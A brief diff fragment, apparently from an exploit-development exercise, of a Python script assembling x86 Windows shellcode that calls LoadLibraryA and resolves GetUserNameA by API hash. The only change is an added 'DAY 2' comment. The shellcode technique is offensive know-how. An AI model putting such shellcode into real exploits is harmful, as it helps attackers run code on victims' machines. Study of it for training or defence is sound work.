@@ -130,6 +130,8 @@ code += "push esp;"         # Name address
 code += "call [ebp + 0x14];"# call LoadLibraryA
 code += "mov ebx, eax;"
 
+
+#### DAY 2 ####
 # load GetUserNameA  
 code += "push 0x5c52aa34;"
 code += "call dword ptr [ebp+0x4];"  # call find_function
